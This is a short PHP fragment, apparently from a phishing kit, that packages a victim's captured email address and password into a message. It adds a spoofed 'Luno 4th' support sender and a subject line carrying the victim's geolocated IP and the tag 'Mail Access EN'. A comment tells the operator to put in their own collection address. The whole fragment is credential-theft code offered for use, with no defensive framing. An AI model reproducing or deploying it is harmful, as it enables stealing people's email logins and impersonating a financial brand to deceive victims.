...
$email_body = "==========================START=================================== \n";
$email_body .= "Email Address:=>       $name  \n";
$email_body .= "Email Password:=>      $message  \n";
...
$email_from = "Luno 4th <support@".$_SERVER['HTTP_HOST'].">"; //<== update the email address
$email_subject = "[$geoplugin->ip] Mail Access EN | [$name]";
